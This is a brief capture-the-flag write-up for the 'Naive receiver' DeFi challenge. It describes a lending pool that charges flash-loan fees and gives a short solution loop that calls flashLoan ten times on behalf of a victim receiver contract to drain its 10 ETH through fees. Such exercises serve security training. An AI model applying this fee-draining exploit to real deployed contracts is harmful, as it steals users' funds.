# Challenge #2 - Naive receiver

There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.

You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.

Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

# Solution

```
for (let i = 0; i < 10; i++) {
    this.pool.flashLoan(this.receiver.address, 0)
}
```
